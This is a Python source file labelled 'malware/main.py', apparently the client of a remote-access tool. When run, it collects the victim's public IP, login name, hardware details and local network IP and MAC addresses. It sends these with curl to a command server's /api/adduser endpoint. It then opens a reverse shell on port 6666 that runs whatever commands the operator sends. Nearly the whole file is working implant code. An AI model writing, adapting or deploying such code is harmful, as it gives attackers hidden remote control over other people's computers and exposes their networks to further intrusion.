#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    File:   malware/main.py
    Author: codeuk
    Date:   18/07/2022
    Python: 3.10
"""

import os
import sys
import psutil
import socket
import platform
import subprocess
from requests import get

DEBUG = True # only set to True when testing/debugging!

class Settings:
    API = "localhost" # put your server/host ip here (NOT THE URL OR PORT!)
    IP  = get("https://icanhazip.com/").text.split('\n')[0]

class Debug(object):
    """ Simple function logging wrapper """

    @staticmethod
    def log(st, fin):
        def decorate(func):
            def call(*args, **kwargs) -> str:
                st(func)
                result = func(*args, **kwargs)
                fin(func)
                return result
            return call
        return decorate

    @staticmethod
    def start(func, *args, **kwargs) -> None:
        print(
            "\n" if func.__name__ == "ConnectSocket" else ""
            f"Starting -> {func.__name__}" if DEBUG else "")

    @staticmethod
    def end(func, *args, **kwargs) -> None:
        print(f"Finished -> {func.__name__}" if DEBUG else "")

class Connector(Debug):
    """ Connector example - Needs to be improved """

    def __init__(con):
        con.api = f"http://{Settings.API}/api/adduser"
        con.data = {}
        con.GetData()

    @Debug.log(Debug.start, Debug.end)
    def ARP(con) -> str:
        """ Use ARP to get the local network map """
        ips, macs = "", ""
        for device in os.popen("arp -a"):
            if "dynamic" not in device:
                continue
            for device in device.split('\n'):
                if device == '': continue
                ip, _, _, mac, _, _ = device.split('   ')
                ips += f"{ip}%"
                macs += f"{mac}%"
        return ips, macs

    @Debug.log(Debug.start, Debug.end)
    def SysInfo(con) -> str:
        """ Simple System Information """
        sys_info = ""
        uname = platform.uname()
        sys_info += f"{uname.system}%{uname.version}%{uname.processor}"
        return sys_info

    @Debug.log(Debug.start, Debug.end)
    def ConvertBytes(con) -> str:
        """ Convert RAM Bytes to GigaBytes """
        B = psutil.virtual_memory().total
        GB = 1024 ** 3
        return str(int(B / GB))

    @Debug.log(Debug.start, Debug.end)
    def GetData(con) -> None:
        """ Add information to the data dictionary """
        arp = con.ARP()
        con.data["ip"]  = Settings.IP
        con.data["ram"] = con.ConvertBytes()
        con.data["pcname"] = os.getlogin()
        con.data["cores"]  = str(psutil.cpu_count())
        con.data["sysinfo"]  = con.SysInfo()
        con.data["loc_ips"]  = arp[0]
        con.data["loc_macs"] = arp[1]

    def ConnectUser(con) -> None:
        """ CURL is used as Pythons 'requests' wasnt working with the Flask API """
        os.system(
            'curl -X POST -H "Content-Type: application/json" -H "auth: standardAuth" -d "{\\"ip\\": \\"' + con.data["ip"] + '\\", \\"username\\": \\"' + con.data["pcname"] + '\\", \\"pcname\\": \\"%ComputerName%\\", \\"ram\\": \\"' + con.data["ram"] + '\\", \\"localips\\": \\"' + con.data["loc_ips"] + '\\", \\"localmacs\\": \\"' + con.data["loc_macs"] + '\\", \\"cores\\": \\"' + con.data["cores"] + '\\", \\"sysinfo\\": \\"' + con.data["sysinfo"] + '\\"}" http://127.0.0.1:80/api/adduser'
        )

    class Shell(Debug):
        """ Simple Reverse Shell """

        def __init__(self):
            self.host = Settings.API
            self.port = 6666
            self.buff = 1024 * 128
            self.sepr = "<new>"

        @staticmethod
        def Check(cmd) -> str:
            splited_command = cmd.split()
            if splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    return str(e)
                else:
                    return "Changed Directory"
            else:
                return subprocess.getoutput(cmd)

        @Debug.log(Debug.start, Debug.end)
        def ConnectSocket(self):
            s = socket.socket()
            s.connect((self.host, self.port))
            s.send(Settings.IP.encode()) # for socket clients in DB

            while True:
                cmd = s.recv(self.buff).decode()
                output = self.Check(cmd)
                
                if cmd.lower() == "exit":
                    break
                
                cwd = os.getcwd()
                message = f"{output} -> {cwd}"
                s.send(message.encode())

            s.close()

c = Connector()
s = c.Shell()

c.ConnectUser()
s.ConnectSocket()